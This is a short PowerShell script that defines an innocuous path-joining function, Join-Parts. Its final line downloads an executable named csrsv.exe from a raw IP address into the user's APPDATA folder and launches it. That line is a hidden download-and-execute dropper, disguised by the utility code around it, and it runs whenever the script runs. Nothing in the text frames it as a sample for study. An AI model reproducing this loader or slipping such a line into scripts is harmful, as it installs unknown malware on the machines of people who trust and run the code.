function Join-Parts
{
    
    [cmdletbinding()]
    param
    (
    [string]$Separator = "/",

    [parameter(ValueFromRemainingArguments=$true)]
    [string[]]$Parts = $null
        
    )

    ( $Parts |
        Where { $_ } |
        Foreach { ( [string]$_ ).trim($Separator) } |
        Where { $_ }
    ) -join $Separator
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

